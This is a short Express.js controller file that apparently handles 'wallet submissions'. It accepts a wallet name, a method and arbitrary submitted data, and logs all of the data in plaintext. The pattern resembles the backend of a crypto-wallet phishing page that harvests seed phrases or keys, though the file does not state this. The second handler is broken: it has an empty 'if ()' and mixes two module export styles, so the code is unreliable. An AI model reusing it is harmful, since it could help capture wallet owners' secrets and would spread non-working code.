const logger = require('../utils/logger');

exports.handleWalletSubmit = (req, res) => {
  const { type, data, walletName, method } = req.body;

  if (!walletName || !method) {
    return res.status(400).json({ error: 'Missing wallet name or method' });
  }

  logger.log(`\n📬 New Submission:
  Wallet: ${walletName}
  Method: ${method}
  Type: ${type}
  Data: ${JSON.stringify(data, null, 2)}
  `);

  res.status(200).json({ message: 'Submission received successfully' });
};


export const handleWalletLogin = (req,res) => {
  if ()
}